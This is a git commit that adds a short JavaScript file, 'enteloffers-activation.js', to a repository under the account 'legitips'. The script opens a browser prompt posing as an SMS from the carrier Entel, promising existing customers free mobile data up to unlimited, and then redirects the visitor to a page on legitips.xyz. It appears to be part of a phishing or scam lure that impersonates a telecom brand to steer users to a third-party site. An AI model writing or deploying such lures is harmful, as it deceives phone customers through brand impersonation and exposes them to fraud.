2b8e16809774dc7ea6c743d6b7bd8eb041064a1d
legitips <83867893+legitips@users.noreply.github.com>
2024-06-21 23:33:47 -0700

    Create enteloffers-activation.js

---
+++ enteloffers-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('Entel SMS: Estimado cliente, verifique amablemente si su tarjeta SIM Entel califica para recibir desde 5GB hasta datos ilimitados, Recompensa para clientes antiguos, presione 1 para verificar ahora ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/enteloffers.html';
+}
